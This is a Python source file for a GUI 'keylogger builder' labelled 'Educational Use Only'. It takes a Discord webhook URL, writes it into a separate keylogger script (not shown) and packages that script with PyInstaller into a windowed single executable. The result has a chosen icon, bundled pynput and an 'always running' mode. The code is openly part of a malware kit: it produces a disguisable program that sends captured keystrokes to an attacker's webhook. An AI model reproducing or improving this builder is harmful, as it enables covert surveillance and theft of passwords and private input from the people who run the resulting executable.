import customtkinter as ctk
import tkinter.filedialog as fd
import subprocess
import requests
import os
import sys
import shutil
from tkinter import messagebox

class KeyloggerBuilder:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("💎 Crystal's Keylogger - Educational Use Only")
        self.root.geometry("700x500")
        self.root.minsize(650, 450)
        
        # Modern theme configuration
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        
        # Custom color palette
        self.primary = "#3498db"
        self.secondary = "#2ecc71"
        self.danger = "#e74c3c"
        self.dark_bg = "#1a1a2e"
        
        # Configure root window
        self.root.configure(fg_color=self.dark_bg)
        
        # Variables
        self.webhook_url = ctk.StringVar()
        self.icon_path = ctk.StringVar(value="No icon selected")
        self.output_name = ctk.StringVar(value="keylogger.exe")
        
        self.create_ui()
        
    def create_ui(self):
        # Main container with gradient background
        main_frame = ctk.CTkFrame(self.root, fg_color=self.dark_bg)
        main_frame.pack(fill="both", expand=True, padx=0, pady=0)
        
        # Header with logo
        header = ctk.CTkFrame(main_frame, fg_color="transparent", height=60)
        header.pack(fill="x", padx=20, pady=(20,10))
        
        ctk.CTkLabel(
            header,
            text="💎 Crystal's Keylogger (Educational Use Only)",
            font=("Arial", 20, "bold"),
            text_color=self.primary
        ).pack(side="left")
        
        # Settings panel
        settings_frame = ctk.CTkFrame(
            main_frame,
            fg_color="#2a2a3a",
            corner_radius=15
        )
        settings_frame.pack(fill="both", expand=True, padx=20, pady=(0,20))
        
        # Webhook section
        webhook_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        webhook_frame.pack(fill="x", pady=(15,5), padx=15)
        
        ctk.CTkLabel(
            webhook_frame,
            text="🌐 Discord Webhook URL:",
            font=("Arial", 12, "bold")
        ).pack(side="left")
        
        webhook_entry = ctk.CTkEntry(
            webhook_frame,
            textvariable=self.webhook_url,
            width=350,
            placeholder_text="https://discord.com/api/webhooks/...",
            corner_radius=10
        )
        webhook_entry.pack(side="left", padx=10, expand=True, fill="x")
        
        # Test webhook button
        test_btn = ctk.CTkButton(
            webhook_frame,
            text="🔍 Test Connection",
            command=self.test_webhook,
            fg_color=self.secondary,
            hover_color="#27ae60",
            width=120
        )
        test_btn.pack(side="left")

        # Icon selection
        icon_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        icon_frame.pack(fill="x", pady=(10,5), padx=15)
        
        ctk.CTkLabel(
            icon_frame,
            text="🖼️ EXE Icon:",
            font=("Arial", 12, "bold")
        ).pack(side="left")
        
        icon_btn = ctk.CTkButton(
            icon_frame,
            text="📁 Select Icon...",
            command=self.select_icon,
            fg_color="#3a3a4a",
            hover_color="#4a4a5a",
            width=120
        )
        icon_btn.pack(side="left", padx=10)
        
        self.icon_label = ctk.CTkLabel(
            icon_frame,
            textvariable=self.icon_path,
            wraplength=300,
            anchor="w"
        )
        self.icon_label.pack(side="left", fill="x", expand=True)
        
        # Disable options
        disable_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        disable_frame.pack(fill="x", pady=(10,5), padx=15)
        
        ctk.CTkLabel(
            disable_frame,
            text="⏸️ Disable Method:",
            font=("Arial", 12, "bold")
        ).pack(side="left")
        
        disable_options = ctk.CTkFrame(disable_frame, fg_color="transparent")
        disable_options.pack(side="left", padx=10)
        
        self.disable_method = ctk.StringVar(value="always_running")
        ctk.CTkRadioButton(
            disable_options,
            text="Always Running 🔄",
            variable=self.disable_method,
            value="always_running",
            font=("Arial", 11)
        ).pack(side="left", padx=5)
        
        ctk.CTkRadioButton(
            disable_options,
            text="Hotkey (Ctrl+Alt+K [NOT WORKING RN!]) 🔑",
            variable=self.disable_method,
            value="hotkey",
            font=("Arial", 11)
        ).pack(side="left", padx=5)
        
        # Build section
        build_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        build_frame.pack(fill="x", pady=(20,10), padx=15)
        
        self.build_btn = ctk.CTkButton(
            build_frame,
            text="⚡ BUILD KEYLOGGER",
            command=self.build_keylogger,
            fg_color=self.primary,
            hover_color="#2980b9",
            font=("Arial", 14, "bold"),
            height=40
        )
        self.build_btn.pack(fill="x")
        
        # Status console
        console_frame = ctk.CTkFrame(settings_frame, fg_color="#1e1e2e", corner_radius=10)
        console_frame.pack(fill="both", expand=True, padx=15, pady=(0,15))
        
        self.console = ctk.CTkTextbox(
            console_frame,
            height=100,
            fg_color="#1a1a2e",
            text_color="#ffffff",
            font=("Consolas", 11)
        )
        self.console.pack(fill="both", expand=True, padx=5, pady=5)
        
    def test_webhook(self):
        """Test the webhook connection"""
        if not self.webhook_url.get():
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
            
        try:
            response = requests.post(
                self.webhook_url.get(),
                json={"content": "Webhook connection test from Keylogger Builder"},
                timeout=10
            )
            
            if response.status_code in [200, 204]:
                messagebox.showinfo("Success", "Webhook test successful! Check your Discord channel.")
            else:
                messagebox.showerror("Error", 
                    f"Webhook test failed (Status {response.status_code})\n"
                    f"Response: {response.text}"
                )
        except Exception as e:
            messagebox.showerror("Error", f"Webhook test failed:\n{str(e)}")

    def select_icon(self):
        filepath = fd.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if filepath:
            self.icon_path.set(filepath)
            
    def log(self, message):
        self.console.insert("end", message + "\n")
        self.console.see("end")
        self.root.update()
        
    def build_keylogger(self):
        if not self.webhook_url.get():
            messagebox.showerror("Error", "Please enter a Discord webhook URL")
            return
            
        self.log("Starting simplified build process...")
        
        try:
            # Create fresh build directory
            if os.path.exists("build"):
                shutil.rmtree("build")
            os.makedirs("build")
            
            # Create clean keylogger.py copy with proper webhook handling
            with open("keylogger.py", "r", encoding='utf-8') as src, open("build/keylogger.py", "w", encoding='utf-8') as dst:
                content = src.read()
                # Replace the webhook placeholder with actual value
                if 'webhook_url = ' in content:
                    content = content.replace(
                        'webhook_url = None',  # Original placeholder
                        f'webhook_url = "{self.webhook_url.get()}"'
                    )
                else:
                    # Add webhook config if not found
                    config = f"""
# Configuration
webhook_url = "{self.webhook_url.get()}"
disable_method = "{self.disable_method.get()}"
"""
                    content = config + content
                
                # Add debug logging
                debug_code = """
import logging
logging.basicConfig(
    filename='keyloader_debug.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
"""
                content = debug_code + content
                dst.write(content)
            
            # Create requirements.txt with exact versions used in build
            import pkg_resources
            import pynput  # Add explicit import
            reqs = [
                f"requests=={pkg_resources.get_distribution('requests').version}",
                f"pynput=={pkg_resources.get_distribution('pynput').version}"
            ]
            with open("build/requirements.txt", "w") as f:
                f.write("\n".join(reqs))
            
            # Enhanced PyInstaller command with full dependency handling
            cmd = [
                "pyinstaller",
                "--onefile",
                "--windowed",
                "--clean",
                "--name", self.output_name.get(),
                "--hidden-import=requests",
                "--hidden-import=pynput.keyboard._win32",
                "--hidden-import=pynput.keyboard._nix",
                "--hidden-import=pynput.mouse._win32", 
                "--hidden-import=pynput.mouse._nix",
                "--add-data", f"{os.path.dirname(requests.__file__)};requests",
                "--add-data", f"{os.path.dirname(pynput.__file__)};pynput",
                "--add-data", "build/requirements.txt;.",
                "--exclude-module=pygame",
                "--additional-hooks-dir=.",
                "--collect-all", "pynput",
                "--collect-all", "requests",
                "build/keylogger.py"
            ]
            
            if os.path.exists(self.icon_path.get()):
                cmd.extend(["--icon", self.icon_path.get()])
                
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                raise Exception(f"PyInstaller failed:\n{result.stderr}")
                
            self.log("Build completed successfully!")
            messagebox.showinfo("Success", f"Keylogger built as {self.output_name.get()}.exe")
            
        except Exception as e:
            self.log(f"Error: {str(e)}")
            messagebox.showerror("Error", f"Build failed: {str(e)}")
            
            
        # Clean up build files
        shutil.rmtree("build")
        if os.path.exists("keylogger.spec"):
            os.remove("keylogger.spec")

if __name__ == "__main__":
    app = KeyloggerBuilder()
    app.root.mainloop()
